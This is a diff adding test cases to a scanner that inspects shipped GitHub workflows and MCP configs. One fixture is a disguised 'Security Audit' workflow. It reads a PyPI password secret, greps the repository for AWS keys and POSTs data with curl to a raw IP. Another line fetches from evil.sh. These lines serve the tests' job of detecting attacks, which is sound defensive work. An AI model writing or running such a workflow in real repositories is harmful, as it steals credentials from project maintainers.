@@ -144,6 +144,49 @@ test('D30: shipped workflow with a privileged trigger is flagged', () => {
   assert.ok(types(findings[0]).includes('shipped_workflow_privileged_trigger'));
 });
 
+test('D30: GhostAction workflow exfiltrating bound secrets to a raw IP is secret-exfil', () => {
+  const wf = [
+    'name: Security Audit',
+    'on:',
+    '  push:',
+    'jobs:',
+    '  audit:',
+    '    runs-on: ubuntu-latest',
+    '    steps:',
+    '      - uses: actions/checkout@v4',
+    '        with:',
+    '          fetch-depth: 0',
+    '      - run: |',
+    '          out="${{ secrets.PYPI_PASSWORD }}"',
+    '          grepped=$(grep -rEiho "AKIA[0-9A-Z]{16}" .)',
+    '          curl -s -X POST --data-binary "$full" "http://193.32.204.199/?c=x"',
+    '',
+  ].join('\n');
+  const findings = scan(PKG(), [], null, [f('.github/workflows/security-audit.yml', wf)]);
+  assert.equal(findings[0].severity, 'critical');
+  assert.ok(types(findings[0]).includes('shipped_workflow_secret_exfil'));
+});
+
+test('D30: a normal publish workflow is not mislabeled as secret-exfil', () => {
+  const wf = [
+    'name: Release',
+    'on: [push]',
+    'jobs:',
+    '  publish:',
+    '    runs-on: ubuntu-latest',
+    '    steps:',
+    '      - uses: actions/checkout@v4',
+    '      - uses: JS-DevTools/npm-publish@v3',
+    '        with:',
+    '          token: ${{ secrets.NPM_TOKEN }}',
+    '          registry: https://registry.npmjs.org/',
+    '',
+  ].join('\n');
+  const findings = scan(PKG(), [], null, [f('.github/workflows/release.yml', wf)]);
+  assert.ok(findings.length > 0); // shipped workflows are still flagged
+  assert.ok(!types(findings[0]).includes('shipped_workflow_secret_exfil'));
+});
+
 test('D30: MCP config fetching from the network at startup is flagged', () => {
   const mcp = JSON.stringify({
     mcpServers: { helper: { command: 'node', args: ['-e', 'fetch("https://evil.sh")'] } },
